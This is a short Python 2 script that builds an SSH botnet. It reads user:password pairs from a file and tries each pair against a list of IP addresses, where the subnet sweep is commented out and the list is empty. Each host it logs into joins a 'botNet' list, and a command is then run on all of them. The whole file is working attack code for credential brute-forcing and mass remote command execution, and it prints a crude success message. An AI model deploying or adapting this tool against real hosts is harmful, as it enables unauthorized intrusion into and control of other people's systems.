#!/usr/bin/python
import pxssh
import PySweeper
import sys

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print "[-] Error Connecting"

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print "[*] Output from " + client.host
        print "[+] " + output

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
#sweeper = PySweeper.PySweeper()
#ips = sweeper.subnet(144)
ips = []

with open('/etc/pass') as f:
    credentials = [x.strip().split(':') for x in f.readlines()]

for ip in ips:
    for user, passwd in credentials:
        print "trying ssh " + user + "@" + ip + " with passwd: " + passwd[:3]
        client = Client(ip, user, passwd)
        if client.session is None:
            pass
        else:
            print "Connected to that bitch!"
            botNet.append(client)
            break

botnetCommand("ls -la")
